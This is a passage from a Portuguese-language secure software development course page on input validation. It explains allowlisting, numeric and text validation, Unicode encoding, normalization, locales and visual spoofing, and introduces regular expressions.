class=headerlink href=#implementacao-da-validacao-de-entrada title="Permanent link">¶</a></h2> <p>Você pode saber o que seu software deve fazer (requisitos) e pode ter uma maneira de dividir o problema (design).</p> <p>Mas, se sua implementação for ruim, o software é ruim!</p> <p>Faremos isso considerando uma visão bastante abstrata de um programa, como ilustrado na figura a seguir:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=../img/Pasted%20image%2020250519071447.png><img alt="Pasted image 20250519071447.png" src=../img/Pasted%20image%2020250519071447.png></a></p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Validação de entrada</td> <td>Este capítulo descreve como validar entradas, incluindo como validar números e texto, a importância de minimizar superfícies de ataque e como melhorar a disponibilidade considerando as entradas.</td> </tr> <tr> <td>Processamento de dados com segurança</td> <td>Este capítulo descreve como processar dados dentro do software com a segurança em mente, incluindo tratar dados não confiáveis ​​como perigosos, evitar credenciais padrão e codificadas, evitar problemas de segurança de memória (como estouros de buffer) e evitar comportamento indefinido.</td> </tr> <tr> <td>Chamando outros programas</td> <td>Este capítulo descreve como chamar outros programas com segurança, incluindo como combater ataques de injeção (incluindo injeção de SQL e injeção de comando do sistema operacional) e como lidar corretamente com nomes de arquivos/caminhos.</td> </tr> <tr> <td>Enviando saída</td> <td>Este capítulo descreve como enviar saídas com segurança, incluindo como combater ataques de cross-site scripting (XSS), usar cabeçalhos de proteção HTTP e usar sistemas de formatação com segurança.</td> </tr> <tr> <td>Quase todos os programas têm entradas, processam dados, ocasionalmente chamam outros programas e, eventualmente, produzem saída(s).</td> <td></td> </tr> </tbody> </table> <p>Chamar outro programa cria (essencialmente) entradas para esses outros programas e saídas desses outros programas. As próximas seções discutirão cada uma dessas áreas separadamente. Em seguida, discutiremos alguns tópicos especializados.</p> <p>É claro que dizer apenas <em>"escreva código seguro"</em> ou <em>"não cometa erros"</em> não ajuda.</p> <p>A boa notícia é que quase todos os erros que causam vulnerabilidades hoje podem ser agrupados em um número relativamente pequeno de categorias, e algumas dessas categorias são especialmente comuns.</p> <p>Portanto, como observado anteriormente, podemos eliminar a grande maioria das vulnerabilidades de segurança simplesmente aprendendo sobre essas categorias, sabendo como procurá-las e mitigá-las.</p> <p>Mencionaremos repetidamente a Lista OWASP Top 10 (para aplicações web) e a Lista CWE Top 25 (para aplicações em geral), pois elas fornecem uma maneira útil de identificar o que é mais importante.</p> <p>Alguns dos tipos comuns de vulnerabilidades são problemas de design. No entanto, a maioria dos demais são problemas de implementação.</p> <p>À medida que analisamos nosso modelo de programa, discutiremos os tipos relevantes de vulnerabilidades, incluindo como detectá-las e combatê-las. Ao começar a aplicar essas informações, você verá que muitas vulnerabilidades desaparecem do seu programa.</p> <p>Praticamente todos os programas precisam aceitar entradas. Portanto, começaremos examinando como implementar software seguro discutindo como lidar com entradas de forma segura.</p> <h2 id=introducao-aos-principios-basicos-de-validacao-de-entrada>Introdução aos princípios básicos de validação de entrada<a class=headerlink href=#introducao-aos-principios-basicos-de-validacao-de-entrada title="Permanent link">¶</a></h2> <p>Algumas entradas são de usuários não confiáveis, e essas entradas (pelo menos) precisam ser validadas antes de serem usadas.</p> <p>Se você impedir que dados inválidos entrem em seu programa, será muito mais difícil para invasores explorarem seu software.</p> <p>A validação de entradas também pode evitar muitos bugs e tornar seu programa mais simples. Afinal, se o seu programa puder rejeitar imediatamente alguns dados malformados, você não precisará escrever o código para lidar com esses casos especiais posteriormente. Isso economiza tempo, e esse código para casos especiais tem maior probabilidade de conter erros sutis.</p> <p>Também pode ser uma boa ideia verificar as entradas de usuários confiáveis.</p> <p>Até mesmo usuários confiáveis ​​cometem erros, e detectá-los imediatamente pode tornar o sistema mais confiável. Há um debate sobre quanta validação deve ser feita nas entradas de usuários confiáveis.</p> <p>Por um lado, usuários confiáveis ​​podem claramente cometer erros, e a validação pode evitar erros dispendiosos. Por outro lado, se muito tempo for gasto na validação de entradas de usuários confiáveis, talvez outras tarefas mais importantes sejam ignoradas, e às vezes usuários confiáveis ​​precisam ser capazes de fazer coisas incomuns para responder a eventos inesperados. Onde não for muito demorado, provavelmente é melhor fazer pelo menos alguma validação de entrada também em entradas de usuários confiáveis.</p> <p>Primeiro, certifique-se de identificar todas as entradas de usuários potencialmente não confiáveis ​​para validá-las. Sempre que possível, elimine as entradas ou impossibilite que usuários não confiáveis ​​forneçam informações a eles. Discutimos isso na <strong>Parte 1</strong>  deste curso, pois o princípio de design <em>minimiza a superfície de ataque</em>.</p> <p>A cada entrada restante de usuários potencialmente não confiáveis, você precisa validar os dados recebidos. Essas verificações de validação de entrada são um tipo de verificação de segurança, portanto, você precisa garantir que essas verificações de validação de entrada não sejam contornáveis, como discutimos anteriormente no curso, no princípio de design <strong><em>non-bypassability</em></strong>. </p> <p><strong>Como um lembrete:</strong> confie apenas nas verificações de segurança (incluindo a validação de entrada) quando elas forem executadas em um ambiente em que você confia. Isso é especialmente importante para programas JavaScript - já que o JavaScript pode ser executado em navegadores da web, é fácil enviar verificações de segurança para o navegador da web e esquecer que <em>os invasores</em> podem controlar seus próprios navegadores da web.</p> <p>Quaisquer verificações de validação de entrada que você fizer em um ambiente não confiável não podem ser confiáveis. Se você confia no seu ambiente de servidor e não no ambiente do cliente, todas as verificações relevantes para a segurança devem ser feitas no ambiente do servidor. Já discutimos isso, mas é importante enfatizar porque é um problema muito comum e sério. Agora, vamos passar para como realmente validar a entrada.</p> <h2 id=como-voce-valida-a-entrada>Como você valida a entrada?<a class=headerlink href=#como-voce-valida-a-entrada title="Permanent link">¶</a></h2> <p>Você deve determinar o que é legal, da forma mais restrita possível, e rejeitar qualquer coisa que não corresponda a essa definição.</p> <p>Usar regras que definem o que é legal e, por implicação, rejeitar todo o resto, é chamado de <strong><em>lista de permissões</em></strong> (as próprias regras são uma <em>lista de permissões</em> ).</p> <p><strong>Sinônimos são <em>goodlisting</em> (as regras são a <em>goodlist</em> ) e a historicamente comum <em>whitelisting</em> (as regras são a <em>whitelist</em> )</strong>.</p> <p>Em geral, não faça o inverso. Ou seja, normalmente é um erro tentar identificar o que é ilegal e escrever código para rejeitar apenas esses casos.</p> <p>Essa abordagem geralmente insegura, em que você tenta listar tudo o que deve ser rejeitado, é chamada <strong><em>de denylisting</em></strong> (as regras são uma <em>denylist</em> ). Sinônimos para denylisting são <em>badlisting</em> e a historicamente comum <em>blacklisting</em> (as regras são então chamadas de <em>badlist</em> ou <em>blacklist</em> ).</p> <p>A denylisting normalmente leva a vulnerabilidades de segurança, porque, se você esquecer de lidar com um ou mais casos importantes de entrada ilegal, pode ser uma oportunidade para um invasor. Se você se esquecer de permitir um caso, receberá um relatório de bug e seu software falhará com segurança. Além disso, geralmente é muito mais fácil simplesmente identificar <em>o que é permitido</em> e permitir apenas essas entradas. Em alguns casos raros, você <em>pode</em> ter certeza absoluta de que enumerou todas as entradas incorretas possíveis, e nesse caso a inclusão na lista de bloqueios é aceitável, mas esses são raros. Geralmente, a inclusão na lista de bloqueios leva a problemas.</p> <p>A boa notícia é que geralmente não demora muito para adicionar a validação de entrada, o que pode tornar seu programa imediatamente mais difícil de ser atacado. Pode ser difícil decidir sobre uma resposta amigável para uma entrada inválida, mas é mais fácil do que sofrer um ataque bem-sucedido.</p> <p>Há um bom motivo para identificar valores <em>ilegais</em>; use-os como um conjunto de testes para garantir que seu código de validação seja completo. Esses testes podem ser executados apenas mentalmente, mas pelo menos alguns devem se tornar casos de teste em seu conjunto de testes automatizados.</p> <p>Quando configuramos um filtro de entrada, atacamos mentalmente nossa lista de permissões com alguns valores ilegais pré-identificados para garantir que alguns valores ilegais óbvios não passem.</p> <p>Dependendo da entrada, aqui estão alguns exemplos de valores ilegais comuns que seus filtros de entrada podem precisar para evitar strings vazias, " <strong>.</strong> ", " <strong>..</strong> ", " <strong>../</strong> ", qualquer coisa que comece com " <strong>/</strong> " ou " <strong>.</strong> ", qualquer coisa com " <strong>/</strong> " ou " <strong>&amp;</strong> " dentro dela, metacaracteres comuns (como ponto e vírgula, aspas simples, aspas duplas e o símbolo de menor que) e quaisquer caracteres de controle (especialmente o caractere NUL e a quebra de linha).</p> <p>Onde números são esperados, verifique se há outros tipos de texto que não devem ser permitidos. Além disso, verifique se há entradas muito, muito longas.</p> <p>Mais adiante, discutiremos vários tipos de ferramentas de análise de segurança. Um tipo, os fuzzers, cria intencionalmente um grande número de entradas maliciosas que (entre outras coisas) testam a qualidade das suas verificações de validação de entrada. Mas os fuzzers não garantem a detecção de todos os problemas de validação de entrada. Em vez disso, implemente cuidadosamente sua validação de entrada e, em seguida, use ferramentas que o ajudem a encontrar problemas que, de outra forma, você não teria detectado.</p> <p>Novamente, seu código deve usar <em>lista de permissões</em> (identificando de forma restrita o que é legal e rejeitando o restante), e não <em>lista de negação</em> (tentando identificar entradas inválidas). Tente tornar esse padrão de lista de permissões o mais restrito possível, incluindo a limitação do comprimento máximo da entrada (e do comprimento mínimo da entrada, se aplicável).</p> <h2 id=validacao-de-entrada-alguns-tipos-de-dados-simples>Validação de entrada: alguns tipos de dados simples<a class=headerlink href=#validacao-de-entrada-alguns-tipos-de-dados-simples title="Permanent link">¶</a></h2> <p>Então, como você faz a validação de entrada usando uma lista de permissões (ou seja, um padrão definido o mais estritamente possível)? Resumindo, você faz isso em cada entrada, e o que você verifica depende do tipo de dado. Vamos discutir alguns casos comuns a seguir.</p> <h3 id=numeros>Números<a class=headerlink href=#numeros title="Permanent link">¶</a></h3> <p>Uma entrada comum é uma sequência de caracteres representando um número. Normalmente, você verifica números (especialmente inteiros) para garantir que estejam entre <strong>um valor mínimo e um máximo</strong>.</p> <p>É bom fazer alguma verificação antes de converter o texto em um número, mas neste caso específico, verifique o valor <em>após</em> a conversão para um número, para ter certeza de que o <em>restante</em> do programa só verá esse número se estiver em um intervalo válido. Os mínimos comuns são 0 e 1. Se o número for supostamente um inteiro, certifique-se de que seja um inteiro e rejeite qualquer outro.</p> <p>Quando for prático, armazene o resultado numérico em um tipo estritamente definido para esse propósito.</p> <p>Por exemplo, armazene o número em um tipo inteiro se for um inteiro, use um tipo sem sinal se números negativos não forem permitidos e assim por diante.</p> <p>Se você tiver que aceitar dados de ponto flutuante de um usuário não confiável (e tente não aceitar!), armazene-os em um tipo apropriado e fique atento aos seus muitos casos especiais (como Not a Number ou NaN, infinitos, zero negativo, underflows e overflows). Por exemplo, normalmente, o valor de ponto flutuante NaN não é igual a nenhum valor; ele nem mesmo é igual a si mesmo.</p> <p>Limitar o tipo nem sempre é prático, pois isso depende muito da linguagem; nem todas as linguagens têm esses tipos. Por exemplo, JavaScript não tem um tipo sem sinal.</p> <p>Observe que <em>"permitir apenas um número inteiro entre 0 e 200, incluindo esses pontos finais"</em> é uma lista de permissões; você identificou o padrão do que é permitido, e qualquer outra coisa será rejeitada.</p> <h2 id=formatos-de-texto-especiais-conhecidos>Formatos de texto especiais conhecidos<a class=headerlink href=#formatos-de-texto-especiais-conhecidos title="Permanent link">¶</a></h2> <p>Às vezes, suas entradas são textos com um formato padrão, e existe uma biblioteca que pode fazer a validação para você. Por exemplo, a maioria das linguagens possui alguma rotina que verifica o formato de endereços de e-mail. Se você tiver uma em que possa confiar, use-a!</p> <p>Às vezes, as bibliotecas de validação que você pode usar exigem alguma configuração. Novamente, configure-as para serem o mais restritas (limitadoras) possível. Por exemplo, se você aceitar HTML, limite-o apenas às tags e atributos necessários. Muitas vezes, ao aceitar HTML, você precisa aceitar apenas algumas tags (por exemplo, <code>&lt;i&gt;</code> para itálico, <code>&lt;b&gt;</code> para negrito, <code>&lt;a&gt;</code> para hiperlinks) e atributos (por exemplo, o atributo <code>href</code> da tag <code>&lt;a&gt;</code> para que você possa dizer para onde vincular, e talvez um atributo id , para que outros possam se referir a um ponto específico).</p> <p>Então, quando um invasor tenta fornecer HTML com outras tags (por exemplo, um <code>&lt;script&gt;</code> malicioso ), o validador simplesmente não o aceitará.</p> <p>Alguns formatos de entrada são estruturas compostas de muitos outros dados.</p> <p>Por exemplo, arquivos JSON, XML e CSV podem conter muitos outros dados.</p> <p>Normalmente, você usaria uma biblioteca confiável para examinar e extrair as partes dos dados necessárias e, em seguida, validaria cada parte. Portanto, novamente, se você extrair uma sequência de caracteres representando um número, você validaria o número (por exemplo, para ver se está dentro do intervalo mínimo e máximo). Em muitos casos, é um valor de texto.</p> <p>Muitos programas precisam validar campos de texto, mas as regras desses campos não são definidas em uma biblioteca preexistente. Algumas ferramentas nos permitem lidar com elas facilmente, mas para usá-las, precisamos entender alguns detalhes. Primeiro, precisamos discutir mais sobre texto, Unicode e localidades em geral. Em seguida, discutiremos a validação de texto em geral e a maneira comum de fazê-lo: expressões regulares.</p> <h2 id=sidequest-texto-unicode-e-localidades>Sidequest: Texto, Unicode e Localidades<a class=headerlink href=#sidequest-texto-unicode-e-localidades title="Permanent link">¶</a></h2> <p>Frequentemente, você recebe texto como entrada (seja diretamente ou como parte de uma estrutura maior).</p> <p>Descreveremos texto como simplesmente uma sequência de caracteres. Se a entrada de texto não for confiável, você precisará validá-la. Para entender isso, precisamos entender o que <em>é</em> texto. Um número notavelmente grande de desenvolvedores nunca aprendeu muito sobre texto — embora seja um dos tipos de dados mais comuns — então, vamos garantir que você entenda isso primeiro. Se você já está confiante de que está familiarizado com questões de texto, como Unicode, codificação e localidades, sinta-se à vontade para pular para a próxima etapa.</p> <h2 id=pontos-de-codigo-e-codificacao>Pontos de código e codificação<a class=headerlink href=#pontos-de-codigo-e-codificacao title="Permanent link">¶</a></h2> <p>Os computadores digitais não manipulam caracteres diretamente; em vez disso, precisamos atribuir um número a cada caractere.</p> <p>Diferentes conjuntos de caracteres com diferentes atribuições foram criados para diferentes idiomas, o que criou pesadelos de interoperabilidade. Na grande maioria dos casos atuais, você usará as atribuições de caracteres especificadas pelo Unicode e pela ISO/IEC 10646, que definem um Conjunto Universal de Caracteres (UCS) que atribui um número único ( <em>ponto de código</em> ) para cada caractere. Por exemplo, eles atribuem ao caractere latino " <strong>A</strong> " maiúsculo o número decimal 65.</p> <p>Historicamente, acreditava-se que 16 bits seriam suficientes para identificar todos os caracteres, mas isso era um erro e foi alterado em 1996 (hoje, 21 bits são usados ​​para codificar qualquer caractere).</p> <p>Como resultado desse erro, algumas linguagens de programação têm um tipo "caractere" (por exemplo, <strong>char</strong> do Java ) com apenas 16 bits. Um tipo de dado de 16 bits não pode, por si só, armazenar nenhum caractere arbitrário de 21 bits; portanto, em linguagens de programação e APIs com um "caractere" de 16 bits, um "caractere" às ​​vezes é apenas metade de um caractere real.</p> <p>Textos que usam essas atribuições precisam ser trocados usando uma <em>codificação</em>.</p> <p>Existem cinco codificações padrão para Unicode:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> UTF-32 (big-endian e little-endian);</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> UTF-16 (big-endian e little-endian);</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> UTF-8;</li> </ul> <p>Geralmente, você deve usar UTF-8, a menos que tenha um motivo para fazer o contrário. UTF-16 e UTF-32 têm duas formas: "little endian" e "big endian". Se você não sabe se o destinatário espera big-endian ou little-endian, adicione um <em>marcador de ordem de bytes</em> no início do texto para garantir que o destinatário o interprete corretamente.</p> <p>Ao receber UTF-16 ou UTF-32, seu aplicativo precisa estar atento a isso. Um problema crítico é que algumas sequências de bytes <em>não</em> são válidas; portanto, ao validar a entrada, precisamos garantir que os dados recebidos sejam válidos para a codificação esperada.</p> <h2 id=locais>Locais<a class=headerlink href=#locais title="Permanent link">¶</a></h2> <p>Interpretar caracteres é mais complicado do que você imagina. Muito depende da "localidade", que define o idioma do usuário, o país/região, as preferências de interface do usuário e, provavelmente, a codificação de caracteres.</p> <p>Por exemplo, em sistemas Unix/Linux, o inglês australiano com codificação UTF-8 é representado pela localidade " <strong>en_AU.UTF-8</strong> ".</p> <p>A localidade é importante porque afeta a forma como os caracteres são interpretados. Por exemplo, ela afeta:</p> <ul> <li>Ordem de agrupamento (classificação)</li> <li>Classificação de caracteres (o que é uma "letra"?). Intervalos como "A-Za-z" não listam <em>todos os caracteres alfabéticos</em> em localidades arbitrárias. Se você usa a localidade C ou POSIX e está processando apenas caracteres ASCII, esse intervalo é a lista completa de caracteres alfabéticos, mas isso não é verdade em geral.</li> <li>Conversão de maiúsculas e minúsculas (o que significa maiúsculas e minúsculas em um caractere, se existir?). Observe que, mesmo que haja uma conversão, ela pode não converter para um único caractere em uma determinada localidade.</li> </ul> <p>Se você quiser interpretar o texto da mesma forma, independentemente do local, a solução usual é usar o local "C", também conhecido como "POSIX".</p> <p>A conversão de maiúsculas e minúsculas é especialmente complexa. Alguns idiomas não têm letras maiúsculas e minúsculas. Mesmo que tenham, o mapeamento entre elas é diferente entre as diferentes localidades. Portanto, a versão maiúscula de uma letra <em>não</em> é fixa – ela se baseia na localidade!</p> <p>Um ótimo exemplo disso são as línguas turcas, que usam o alfabeto turco. Nesse alfabeto, "I" com ponto e sem ponto são letras distintas, com formas maiúsculas e minúsculas. Por exemplo, o "i" minúsculo com ponto, quando maiúsculo, torna-se "İ" maiúsculo com ponto (e não o "I" maiúsculo sem ponto, como acontece em uma localidade inglesa), e o "I" maiúsculo sem ponto, quando minúsculo, torna-se "ı" minúsculo sem ponto. Observe que "i" e "I" <em>não</em> são iguais em uma correspondência sem diferenciação de maiúsculas e minúsculas em um sistema implementado corretamente para essas localidades. Isso resultou em várias vulnerabilidades de segurança, e ocasionalmente mencionaremos isso no programa, pois é um ótimo exemplo dos tipos de erros que podem ocorrer se você não estiver ciente disso.</p> <p>Se você quiser saber se <em>duas sequências de caracteres são equivalentes,</em> ignorando maiúsculas e minúsculas, no caso geral, você precisa chamar uma rotina para fazer isso e fornecer a ela a localidade a ser usada. Isso levanta questões sobre equivalência em geral, que discutiremos a seguir.</p> <h2 id=equivalencia-unicode>Equivalência Unicode<a class=headerlink href=#equivalencia-unicode title="Permanent link">¶</a></h2> <p>Muitos programadores presumem que, se uma sequência de "pontos de código" de texto for diferente, elas são strings diferentes. Embora isso seja aceitável para alguns propósitos, esse é o modelo mental errado para outros, mesmo que você presuma que deseja uma correspondência "sensível a maiúsculas e minúsculas". O Unicode teve que ser desenvolvido de forma compatível com os padrões preexistentes, o que levou a algumas complicações.</p> <p>Em alguns casos, você deve usar rotinas de biblioteca para testar a equivalência canônica Unicode. Isso ocorre porque existem alguns pontos de código, ou sequências de pontos de código, que em muitas circunstâncias devem ser considerados <em>equivalentes</em> no sentido de que devem sempre parecer idênticos, mesmo que tenham valores subjacentes diferentes.</p> <p>Por exemplo, o ponto de código U+006E (o "n" minúsculo latino) seguido por U+0303 (o til de combinação "○̃") é canonicamente equivalente ao ponto de código U+00F1 ("ñ"). Outro exemplo é o caractere "Å", que pode ser representado como U+00C5 (a letra "A MAIÚSCULA COM ANEL ACIMA") ou como U+212B ("SINAL DE ANGSTROM"): esses dois valores devem ser considerados equivalentes.</p> <p>Em outros casos, você deve usar rotinas para testar a compatibilidade com Unicode. Isso ocorre porque existem algumas sequências que podem parecer diferentes, mas têm o mesmo significado subjacente. Por exemplo, o ponto de código U+FB00 (tipográfico "ﬀ") é compatível, mas não equivalente, a U+0066 U+0066 (duas letras latinas "f"). Strings equivalentes são sempre compatíveis, mas strings compatíveis nem sempre são equivalentes.</p> <p>Isso é um problema, então o padrão Unicode define procedimentos de normalização de texto, chamados de normalização Unicode. A normalização Unicode transforma sequências equivalentes ou compatíveis na mesma sequência de caracteres. Existem 4 formas de normalização:</p> <ul> <li>Os caracteres NFD (Decomposição Canônica de Forma de Normalização) são decompostos por equivalência canônica, e vários caracteres de combinação são organizados em uma ordem específica.</li> <li>Caracteres NFC (Normalization Form Canonical Composition) são decompostos e depois recompostos por equivalência canônica.</li> <li>Os caracteres NFKD (Normalization Form Compatibility Decomposition) são decompostos por compatibilidade, e vários caracteres de combinação são organizados em uma ordem específica.</li> <li>Os caracteres NFKC (Normalization Form Compatibility Composition) são decompostos por compatibilidade e depois recompostos por equivalência canônica.</li> </ul> <p>Do ponto de vista da segurança, normalmente não importa <em>qual</em> normalização Unicode você usa, mas, se quiser determinar se duas strings são iguais, você precisa ser <em>consistente</em> quanto à normalização usada ao compará-las. Além disso, observe que, depois de normalizar uma sequência de caracteres, geralmente não é possível regenerar exatamente a sequência original.</p> <h2 id=falsificacao-visual>Falsificação visual<a class=headerlink href=#falsificacao-visual title="Permanent link">¶</a></h2> <p><em>A falsificação visual</em> ocorre quando duas strings diferentes são confundidas pelo usuário como sendo a <em>mesma</em>. Às vezes, invasores usam a falsificação visual como parte de um ataque.</p> <p>A falsificação visual pode ocorrer até mesmo no subconjunto ASCII do Unicode. O dígito "0" se parece com a letra maiúscula "O", e o dígito "1" se parece com a letra minúscula "l".</p> <p>Por exemplo, um invasor pode tentar criar um domínio malicioso <strong>paypa1.com em vez de</strong> <strong>paypal.com</strong>. A sequência "rn" às vezes é interpretada erroneamente como a letra "m"! Dito isso, a maioria dos usuários de alfabetos latinos está ciente desses problemas, e muitas fontes tomam o cuidado de torná-los mais distinguíveis.</p> <p>Mas quando vamos além do subconjunto ASCII, existem muitos outros truques:</p> <ul> <li>A decomposição "ƶ" pode ser expressa como U+007A U+0335 (z + sobreposição de traços curtos combinados) ou como U+01B6. Isso significa que diferentes sequências de bytes ainda podem indicar a mesma letra (e, portanto, parecer idênticas). A normalização resolve esse problema.</li> <li>O ômicron grego de escrita mista e o "o" latino geralmente têm a mesma aparência, mesmo estando em seções diferentes do Unicode.</li> <li>Mesma escrita: alguns caracteres simplesmente parecem semelhantes. Por exemplo, "-" Hífen-menos U+002D vs. hífen "-" U+2010.</li> <li>Falsificação de Texto Bidirecional: Alguns idiomas são majoritariamente escritos da direita para a esquerda, mas em certas situações mudam para a esquerda para a direita. Assim, o Unicode inclui mecanismos para indicar a direção. Mas isso significa que a string "olleh", cercada por "use right-to-left", terá a mesma aparência visual de "hello".</li> </ul> <p>A falsificação visual pode ser muito difícil de combater em geral. A normalização e o uso de fontes distintas nem sempre são suficientes, mas às vezes podem ser muito úteis.</p> <h2 id=validando-texto>Validando Texto<a class=headerlink href=#validando-texto title="Permanent link">¶</a></h2> <p>Agora que entendemos o texto, vamos falar sobre sua validação. Em quase todos os casos, há pelo menos duas verificações a serem feitas em textos de fontes não confiáveis:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Valide se o texto está na codificação de texto esperada. Conforme observado anteriormente, a menos que você tenha um motivo para fazer o contrário, recomendamos usar a codificação UTF-8.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> UTF-8 permite trabalhar com scripts de qualquer linguagem, é compatível com versões anteriores do ASCII e tem amplo suporte. UTF-8 é uma boa codificação, mas nem toda sequência de bytes é UTF-8 válida. Muitas vulnerabilidades ocorreram porque um sistema aceitou bytes de um invasor que não são UTF-8 válidos. Portanto, é muito importante validar o texto em UTF-8 antes de aceitá-lo de uma fonte não confiável.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Verifique se está dentro dos comprimentos mínimo e máximo, se há comprimentos mínimo e máximo. Muitos sistemas desejam ter um máximo simplesmente para evitar que invasores enviem quantidades absurdamente grandes de dados.</li> </ul> <p>Nomes pessoais, em particular, são desafiadores, especialmente se você precisar lidar com nomes em todas as localidades.</p> <p>Muitas localidades têm convenções diferentes de outras localidades; por exemplo, o nome próprio ou o sobrenome (por exemplo, nome de família) é listado primeiro? Pode nem haver um sobrenome ou nome próprio. Nomes podem conter espaços (mesmo dentro de um nome próprio ou sobrenome) e, claro, não há garantia de que o nome use apenas caracteres latinos ou chineses.</p> <p>Para uma discussão sobre os desafios, consulte o artigo <em><a href=https://shinesolutions.com/2018/01/08/falsehoods-programmers-believe-about-names-with-examples/ >"Falsidades em que Programadores Acreditam sobre Nomes - Com Exemplos",</a></em> de Tony Rogers (2018).</p> <p>Em muitos casos, porém, há mais que você precisa fazer para validar o texto. Em muitos casos, os valores de texto têm regras adicionais que precisam obedecer, e essas regras variam dependendo de cada entrada de texto.</p> <p>Às vezes, o valor do texto precisa ser um de uma pequena lista de valores. Isso é fácil: basta armazenar a coleção permitida em algum lugar (por exemplo, em um conjunto ou dicionário). Então, sempre que receber uma entrada, valide se a entrada é um dos valores permitidos.</p> <p>Mas isso nos deixa com as muitas entradas de texto que possuem regras, mas elas não são apenas uma lista de valores permitidos.</p> <p>Podem ser datas, horas, números de peças, números de telefone, locais e uma série de outros tipos de dados. Ainda precisamos validar essas entradas, e muitos programas possuem diversos tipos de dados. Isso significa que precisamos de uma maneira de descrever <em>facilmente</em> essas regras de validação.</p> <p>A ferramenta comum para esse propósito são as expressões regulares. Na próxima unidade, explicaremos opcionalmente as expressões regulares (regexes) caso você não esteja familiarizado com elas; a unidade seguinte explicará como usar expressões regulares para validar entradas.</p> <h2 id=introducao-as-expressoes-regulares>Introdução às Expressões Regulares<a class=headerlink href=#introducao-as-expressoes-regulares title="Permanent link">¶</a></h2> <p>Uma expressão regular ( <em>regex</em> ) é uma sequência de caracteres que define um padrão de texto. Praticamente todas as linguagens de programação possuem um sistema integrado ou uma biblioteca de fácil aquisição que implementa uma linguagem de expressões regulares, portanto, geralmente é fácil começar a usar expressões regulares em um programa, independentemente de como ele seja implementado.</p> <p>No entanto, alguns desenvolvedores de software nunca utilizaram expressões regulares. Esta unidade oferece uma breve introdução caso você ainda não esteja familiarizado com elas. Se você já entende de expressões regulares, sinta-se à vontade para pular para a próxima unidade!</p> <p>Historicamente, as expressões regulares foram desenvolvidas para facilitar a busca por texto, embora agora sejam frequentemente usadas para determinar se um texto corresponde a um padrão. Existem muitas implementações de sistemas de expressões regulares, mas como todas têm a mesma origem histórica, elas têm muito em comum.</p> <p>A regra mais trivial é que uma letra ou dígito corresponde a si mesmo. Ou seja, a expressão regular " <strong>d</strong> " corresponde à letra " <strong>d</strong> ". A maioria das implementações utiliza correspondências com diferenciação entre maiúsculas e minúsculas por padrão, e geralmente é isso que você deseja.</p> <p>Outra regra é que colchetes circundam uma regra que especifica qualquer um de um número de caracteres. Se os colchetes circundam apenas caracteres alfanuméricos, o padrão corresponde a qualquer um deles. Portanto, <strong>[brt]</strong> corresponde a um único " <strong>b</strong> ", " <strong>r</strong> " ou " <strong>t</strong> ".</p> <p>O padrão " <strong>.</strong> " corresponde a qualquer caractere, com a possível exceção do caractere de quebra de linha. Se você quiser corresponder a um ponto literal, coloque uma barra invertida (" <strong>** **.</strong> ") antes dele. Praticamente todas as implementações de expressões regulares têm um mecanismo que permite decidir se " <strong>.</strong> " deve corresponder a uma quebra de linha.</p> <p>Um padrão regex geralmente é uma sequência de regras, declaradas uma após a outra. Por exemplo, o padrão regex " <strong>ca[brt]</strong> " corresponderá ao texto " <strong>cab</strong> ", " <strong>car</strong> " ou " <strong>cat</strong> ", porque as letras " <strong>c</strong> " e " <strong>a</strong> " correspondem a si mesmas, e " <strong>[brt]</strong> " corresponde a um único " <strong>b</strong> ", " <strong>r</strong> " ou " <strong>t</strong> ".</p> <p>Na verdade, por padrão, as expressões regulares <em>buscam</em> o padrão fornecido em uma string. Ou seja, normalmente, uma implementação de expressão regular verifica se um padrão corresponde a algum texto se ele começa no primeiro caractere, depois no segundo e assim por diante, informando se consegue encontrar <em>alguma</em> correspondência. Portanto, o padrão " <strong>ca[brt]</strong> " também corresponderá a " <strong>abdicate</strong> " porque há um " <strong>cat</strong> " na palavra " <strong>abdicate</strong> ".</p> <p>Expressões regulares podem fazer muito mais, no entanto. Se você seguir um padrão com " ***** ", isso significa " <em>0 ou mais vezes</em> ". Portanto, o padrão regex " <strong>a*b*x</strong> " descreve um padrão de 0 ou mais <strong>a</strong> 's, seguido por 0 ou mais <strong>b</strong> 's, seguido por <strong>x</strong>. Esse padrão corresponde a strings como " <strong>aabx</strong> ", " <strong>bbbx</strong> " e " <strong>abx</strong> ", mas não <strong>aabb</strong> ". A maioria das implementações de regex também suporta " <strong>+</strong> " para " <em>1 ou mais vezes</em> " e " <strong>?</strong> " para " <em>0 ou 1 vezes</em> ". A maioria das implementações de regex também permite que você use parênteses para agrupar expressões, por exemplo, " <strong>f(abc)*d</strong> " corresponde se houver um " <strong>f</strong> ", seguido por 0 ou mais instâncias da sequência " <strong>abc</strong> ", seguida pela letra " <strong>d</strong> ".</p> <p>Geralmente, é possível fazer uma correspondência que não diferencia maiúsculas de minúsculas por meio de alguma opção. Certifique-se de definir a localidade se usar a correspondência que não diferencia maiúsculas de minúsculas, pois diferentes idiomas têm regras diferentes e, às vezes, essas regras podem ser complexas. Por exemplo, em alemão, o caractere minúsculo "sustenido" " <strong>ß</strong> " é equivalente ao maiúsculo " <strong>SS</strong> " ao usar uma correspondência que não diferencia maiúsculas de minúsculas. Em alguns casos, você pode querer fazer apenas a " <em>correspondência ASCII que não diferencia maiúsculas</em> de minúsculas"; isso compara uma sequência de pontos de código como se todos os pontos de código ASCII no intervalo de 0x41 a 0x5A (A a Z) fossem mapeados para os pontos de código correspondentes no intervalo de 0x61 a 0x7A (a a z).</p> <p>Expressões regulares são muito mais do que isso. Aliás, existe um livro inteiro dedicado apenas a expressões regulares, <em><a href=https://www.oreilly.com/library/view/mastering-regular-expressions/0596528124/ >Mastering Regular Expressions, 3ª Edição</a></em> , de Jeffrey Friedl (2006), e há muitos tutoriais sobre expressões regulares, como o tutorial <a href=https://refrf.shreyasminocha.me/ ><em>"Expressões Regulares para o Povo Regular",</em></a> de Shreyas Minocha. Mas essa introdução nos ajudará a começar, pois agora discutiremos como as expressões regulares podem ser usadas para validação de 